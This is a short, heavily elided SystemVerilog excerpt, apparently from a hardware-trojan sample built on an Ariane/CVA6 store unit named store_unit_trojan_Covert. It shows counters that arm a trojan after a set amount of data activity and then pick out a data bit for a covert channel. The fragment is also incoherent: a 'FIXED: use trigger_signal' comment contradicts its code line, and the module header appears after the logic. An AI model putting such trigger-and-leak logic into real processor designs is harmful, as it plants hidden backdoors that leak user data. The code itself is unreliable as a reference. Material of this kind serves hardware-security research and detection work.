...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 4865;
    localparam int ACTIVATE_DELAY = 2432;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && data_tmp) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && data_tmp) trojan_counter2 <= trojan_counter2 + 1;
        ...
        assign current_bit = data_tmp[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module store_unit_trojan_Covert
  import ariane_pkg::*;
#(
